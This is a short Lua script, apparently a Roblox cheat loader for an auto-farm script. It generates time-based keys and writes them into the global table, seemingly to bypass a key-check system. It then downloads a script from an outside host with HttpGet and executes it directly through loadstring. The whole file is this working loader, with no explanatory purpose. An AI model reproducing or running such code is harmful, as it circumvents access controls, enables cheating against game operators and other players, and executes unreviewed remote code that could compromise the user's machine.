local current = math.floor(os.time()/30)
local nxt = current+1

local rand = Random.new(current)
local currentkey = ""
for i = 1,10 do
	currentkey = currentkey..string.char(rand:NextInteger(33,126))
end

local rand2 = Random.new(nxt)
local nextkey = ""
for i = 1,10 do
	nextkey = nextkey..string.char(rand2:NextInteger(33,126))
end

_G[currentkey] = true
_G[nextkey] = true

loadstring(game:HttpGet("https://pl.gt.tc/buildaringfarm.txt"))()
